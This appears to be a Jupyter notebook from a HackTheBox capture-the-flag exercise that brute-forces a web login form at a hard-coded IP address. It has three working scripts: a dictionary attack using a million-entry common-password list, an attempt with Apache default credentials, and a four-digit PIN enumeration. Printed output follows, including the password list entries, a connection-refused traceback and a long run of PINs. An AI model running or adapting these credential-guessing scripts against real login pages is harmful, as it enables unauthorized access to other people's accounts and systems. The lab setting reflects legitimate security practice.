# %%
import requests
import csv

url = 'http://88.198.233.174:36217/'

# %%
with open('utils/10-million-password-list-top-1000000.txt', 'r') as pswdfile:
        for p in pswdfile:
            print (p)
            if not ('Invalid password!' in requests.request('POST', url, data = {'password': '{}'.format(p)}).text):
                print('YEEESSSSSSSSSSSSSSSSSSSSSSSSSSS_____________________________________________')
                break
# Out:
# 123456
#
# password
#
# 12345678
#
# qwerty
#
# 123456789
#
# 12345
#
# 1234
#
# 111111
#
# 1234567
#
# dragon
#
# 123123
#
# baseball
#
# abc123
#
# football
#
# monkey
#
# letmein
#
# 696969
#
# shadow
#
# master
#
# 666666
#
# qwertyuiop
#
# 123321
#
# mustang
#
# 1234567890
#
# michael
#
# 654321
#
# pussy
#
# superman
#
# 1qaz2wsx
#
# 7777777
#
# fuckyou
#
# 121212
#
# 000000
#
# qazwsx
#
# 123qwe
#
# killer
#
# trustno1
#
# jordan
#
# jennifer
#
# zxcvbnm
#
# asdfgh
#
# hunter
#
# buster
#
# soccer
#
# harley
#
# batman
#
# andrew
#
# tigger
#
# sunshine
#
# iloveyou
#
# fuckme
#
# 2000
#
# charlie
#
# robert
#
# thomas
#
# hockey
#
# ranger
#
# daniel
#
# starwars
#
# klaster
#
# 112233
#
# george
#
# asshole
#
# computer
#
# michelle
#
# jessica
#
# pepper
#
# 1111
#
# zxcvbn
#
# 555555
#
# 11111111
#
# 131313
#
# freedom
#
# 777777
#
# pass
#
# fuck
#
# maggie
#
# 159753
#
# aaaaaa
#
# ginger
#
# princess
#
# joshua
#
# cheese
#
# amanda
#
# summer
#
# love
#
# ashley
#
# ...

# %%
with open('utils/default-passwords.csv') as csvfile:
    spamreader = csv.reader(csvfile, delimiter=',')
    for row in spamreader:
        if 'Apache' in row[0]:
            print (row[1], row[2])
            if not ('Invalid password!' in requests.request('POST', url, data = {'password': '{}'.format(row[2])}).text):
                print('YEEESSSSSSSSSSSSSSSSSSSSSSSSSSS_____________________________________________')
                break
# Out:
# jj <BLANK>
# ---------------------------------------------------------------------------
# ConnectionRefusedError                    Traceback (most recent call last)
# c:\users\orwell\documents\hackthebox\env\lib\site-packages\urllib3\connection.py in _new_conn(self)
#     170             conn = connection.create_connection(
# --> 171                 (self._dns_host, self.port), self.timeout, **extra_kw)
#     172
#
# c:\users\orwell\documents\hackthebox\env\lib\site-packages\urllib3\util\connection.py in create_connection(address, timeout, source_address, socket_options)
#      78     if err is not None:
# ---> 79         raise err
#      80
#
# c:\users\orwell\documents\hackthebox\env\lib\site-packages\urllib3\util\connection.py in create_connection(address, timeout, source_address, socket_options)
#      68                 sock.bind(source_address)
# ---> 69             sock.connect(sa)
#      70             return sock
#
# ...

# %%
# Brute force
for a in range(1000):
    print (str(a).zfill(4))
    if not ('Invalid password!' in requests.request(
        'POST', 
        url, 
        data = {'password': '{}'.format(str(a).zfill(4))}).text):
        print('YEEESSSSSSSSSSSSSSSSSSSSSSSSSSS_____________________________________________')
        break
    break
# Out:
# 0000
# 0001
# 0002
# 0003
# 0004
# 0005
# 0006
# 0007
# 0008
# 0009
# 0010
# 0011
# 0012
# 0013
# 0014
# 0015
# 0016
# 0017
# 0018
# 0019
# 0020
# 0021
# 0022
# 0023
# 0024
# 0025
# 0026
# 0027
# 0028
# 0029
# 0030
# 0031
# 0032
# 0033
# 0034
# 0035
# 0036
# 0037
# 0038
# 0039
# 0040
# 0041
# 0042
# 0043
# 0044
# 0045
# 0046
# 0047
# 0048
# 0049
# 0050
# 0051
# 0052
# 0053
# 0054
# 0055
# 0056
# 0057
# 0058
# 0059
# 0060
# 0061
# 0062
# 0063
# 0064
# 0065
# 0066
# 0067
# 0068
# 0069
# 0070
# 0071
# 0072
# 0073
# 0074
# 0075
# 0076
# 0077
# 0078
# 0079
# 0080
# 0081
# 0082
# 0083
# 0084
# 0085
# 0086
# 0087
# 0088
# 0089
# 0090
# 0091
# 0092
# 0093
# 0094
# 0095
# 0096
# 0097
# 0098
# 0099
# 0100
# 0101
# 0102
# 0103
# 0104
# 0105
# 0106
# 0107
# 0108
# 0109
# 0110
# 0111
# 0112
# 0113
# 0114
# 0115
# 0116
# 0117
# 0118
# 0119
# 0120
# 0121
# 0122
# 0123
# 0124
# 0125
# 0126
# 0127
# 0128
# 0129
# 0130
# 0131
# 0132
# 0133
# 0134
# 0135
# 0136
# 0137
# 0138
# 0139
# 0140
# 0141
# ...

# %%
            print (row[2])
